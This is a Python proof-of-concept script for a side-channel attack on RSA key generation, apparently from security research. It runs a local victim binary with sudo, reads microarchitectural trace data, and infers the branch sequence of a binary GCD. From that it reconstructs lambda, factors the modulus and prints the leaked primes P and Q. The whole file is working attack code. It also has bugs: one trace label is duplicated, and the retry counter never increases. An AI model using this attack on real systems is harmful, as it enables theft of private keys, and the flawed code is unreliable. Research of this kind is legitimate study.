import os
import subprocess
import math

def execute_victim_code():
    p = subprocess.Popen("sudo ./app", shell=True, stdout=subprocess.PIPE, text=True)
    e = p.stdout.read()
    return e

def handle_raw_data(e):
    lines = e.strip().split("\n")
    x_loop_idx = lines.index("X-loop-ground-truth:")
    x_loop_ground_truth = [int(i) for i in lines[x_loop_idx + 1].strip().split(" ")]
    sub_step_idx = lines.index("Sub-step-ground-truth:")
    sub_step_ground_truth = [int(i) for i in lines[sub_step_idx + 1].strip().split(" ")]
    assert(len(x_loop_ground_truth) == len(sub_step_ground_truth))
    sca_data = []
    for sca_data_head in ["Sub-step-1-0:", "Sub-step-1-1:", "Sub-step-2-0:", "Sub-step-2-1:",\
                          "Sub-step-3-0:", "Sub-step-3-0:"]:
        sca_data_idx = lines.index(sca_data_head)
        sca_data.append([int(i) for i in lines[sca_data_idx + 1].strip().split(" ")])
    rsa_data = {}
    for i in range(len(lines)):
        if lines[i].startswith("N ="):
            rsa_data["N"] = lines[i].strip()[4:]
    for i in range(len(lines)):
        if lines[i].startswith("E ="):
            rsa_data["E"] = lines[i].strip()[4:]
    for i in range(len(lines)):
        if lines[i].startswith("D ="):
            rsa_data["D"] = lines[i].strip()[4:]
    for i in range(len(lines)):
        if lines[i].startswith("P ="):
            rsa_data["P"] = lines[i].strip()[4:]
    for i in range(len(lines)):
        if lines[i].startswith("Q ="):
            rsa_data["Q"] = lines[i].strip()[4:]
    # print(sub_step_ground_truth)
    raw_output = f'''
  . Seeding the random number generator... ok
  . Generating the RSA key [ 2048-bit ]...  ok
  . Exporting the private key to stdout... ok
    N = {rsa_data["N"]}
    E = {rsa_data["E"]}
    D = {rsa_data["D"]}
    P = {rsa_data["P"]}
    Q = {rsa_data["Q"]}
'''
    with open("rsa_output.txt", "w") as f:
        f.write(raw_output)
    return x_loop_ground_truth, sub_step_ground_truth, sca_data, rsa_data


def recover(sca_data, chosen_ld_list = [1]):
    def recover_single_trace(sca_data_single_trace, if_path, value_init):
        if if_path:
            return [0 if sca_data_single_trace[i] == value_init else 1 for i in range(len(sca_data_single_trace))]
        else: # else_path
            return [1 if sca_data_single_trace[i] == value_init else 0 for i in range(len(sca_data_single_trace))]

    number_of_load_used = len(chosen_ld_list)
    recover_for_each_trace = []

    sca_cf_map = {0: False, 1: True, 2: False, 3: True, 4: False, 5: True}
    counter_init_val_map = {0:13, 1:15, 2:15, 3:6, 4:15, 5:15}
    weight = {0:1, 1:2, 2:1, 3:1, 4:1, 5:1}
    for i in range(0, 6):
        recover_for_each_trace.append(recover_single_trace(sca_data[i], if_path=sca_cf_map[i], value_init=counter_init_val_map[i]))

    voted = [0 for i in range(len(recover_for_each_trace[0]))]
    recovered_control_flow = [-1 for i in range(len(recover_for_each_trace[0]))]
    for i in range(0, number_of_load_used):
        chosen_i = chosen_ld_list[i]
        for j in range(len(voted)):
            if (recover_for_each_trace[chosen_i][j] == 0):
                voted[j] += 1 * weight[chosen_i]
            else:
                voted[j] -= 1 * weight[chosen_i]

    for i in range(0, len(voted)):
        if (voted[i] >= 0):
            recovered_control_flow[i] = 0
        else:
            recovered_control_flow[i] = 1
    
    # for i in range(len(recovered_control_flow)):
        # print(recover_for_each_trace[1][i], recover_for_each_trace[2][i], recover_for_each_trace[4][i], voted[i], recovered_control_flow[i])
    return recovered_control_flow


def evaluate_single_trace(sub_step_ground_truth, sub_step_recovered):
    assert(len(sub_step_ground_truth) == len(sub_step_recovered))
    success_cnt = 0
    for i in range(len(sub_step_ground_truth)):
        if (sub_step_ground_truth[i] == sub_step_recovered[i]):
            success_cnt += 1
    return success_cnt / len(sub_step_ground_truth)

def simulator(P, Q, E):
    # print(f"{E:X}, {P:X}, {Q:X}")
    L = ((P - 1) * (Q - 1)) // math.gcd(P - 1, Q - 1)
    u = E % L
    v = L
    x_loop = [0]
    sub_step = [-1]
    ite = 0
    while  u > 0:
        while u & 1 == 0:
            u >>= 1
            x_loop[ite] += 1
        while v & 1 == 0:
            v >>= 1
            x_loop[ite] += 1
        if (u >= v):
            u = u - v
            sub_step[ite] = 0
        else:
            v = v - u
            sub_step[ite] = 1
        ite += 1
        x_loop.append(0)
        sub_step.append(-1)
    
    return x_loop[:-1], sub_step[:-1]

def infer_private_key(x_loop_ground_truth, sub_step_recovered, E, N, guessed_first_0 = 18):

    def reduce_noise(sub_step):
        for i in range(len(sub_step)):
            if i < len(sub_step) - guessed_first_0:
                sub_step[i] = 1
        return sub_step

    def recover_x_loop(x_loop, sub_step):
        u_loop = []
        v_loop = []
        # 第一次循环必然是 v_loop
        u_loop.append(0)
        v_loop.append(x_loop[0])
        # loop[i+1] 由 sub_step[i] 决定
        for i in range(0, len(x_loop) - 1):
            if (sub_step[i] == 0):
                # u = u - v, u 变成偶数
                u_loop.append(x_loop[i + 1])
                v_loop.append(0)
            else:
                # v = v - u, v 变成偶数
                v_loop.append(x_loop[i + 1])
                u_loop.append(0)
        return(u_loop, v_loop)

    def Newton_Raphson(x):
        n = int(x)
        r = 1 << ((n.bit_length() + 1) >> 1)
        while True:
            newr = (r + n // r) >> 1  # next estimate by Newton-Raphson
            if newr >= r:
                return r
            r = newr

    def analyse_from_trace_e_invmod_lambda(u_loop, v_loop, sub_step, E, N):
        P = 0
        Q = 0
        u = 0
        v = 1
        for i in range(0, len(sub_step)):
            idx = len(sub_step) - i - 1
            if(sub_step[idx] == 0):
                u = u + v
            else:
                v = u + v
            u <<= u_loop[idx]
            v <<= v_loop[idx]
        # u0 = E, v0 = Lambda
        if(u != E):
            return (0,0)
        L = v
        
        # guess fai_N and verify
        for i in range(2, 65536, 2):
            fai_N = L * i
            b = N + 1 - fai_N
            P = (b + Newton_Raphson(b ** 2 - 4 * N)) // 2
            Q = (b - Newton_Raphson(b ** 2 - 4 * N)) // 2
            if (P * Q == N):
                return(P,Q)
        return(0,0)

    sub_step_recovered = reduce_noise(sub_step_recovered)
    u_loop, v_loop = recover_x_loop(x_loop_ground_truth, sub_step_recovered)
    P_recovered, Q_recovered = analyse_from_trace_e_invmod_lambda(u_loop, v_loop, sub_step_recovered, E, N)

    return P_recovered, Q_recovered

def end_to_end_attack(chosen_ld_list=[1]):

    attack_success = False
    try_times = 0
    while not attack_success:
        x_loop_ground_truth, sub_step_ground_truth, sca_data, rsa_data = handle_raw_data(execute_victim_code())

        first_0 = 0
        for i in range(len(sub_step_ground_truth)):
            if sub_step_ground_truth[i] == 0:
                first_0 = len(sub_step_ground_truth) - i
                break

        x_loop_sim, sub_step_sim = simulator(int(rsa_data["P"], 16), int(rsa_data["Q"], 16), int(rsa_data["E"], 16))
        # print(x_loop_sim, sub_step_sim)

        sub_step_recovered = recover(sca_data, chosen_ld_list)
        # print(sub_step_recovered)
        # print("MDU Side Channel Accuracy:", evaluate_single_trace(sub_step_ground_truth, sub_step_recovered))

        P_recover, Q_recover = infer_private_key(x_loop_ground_truth, sub_step_recovered, int(rsa_data["E"], 16), int(rsa_data['N'], 16), first_0)

        if (P_recover == 0 or Q_recover == 0):
            if (try_times < 10):
                print(f"Leak P: {P_recover:X}\nLeak Q: {Q_recover:X}, retry ...")
                continue
            else:
                print("Attack fails, please try again")
                break
        print(f"Leak P: {P_recover:X}\nLeak Q: {Q_recover:X}")
        break


if __name__ == "__main__":
    end_to_end_attack([1,2,3,4])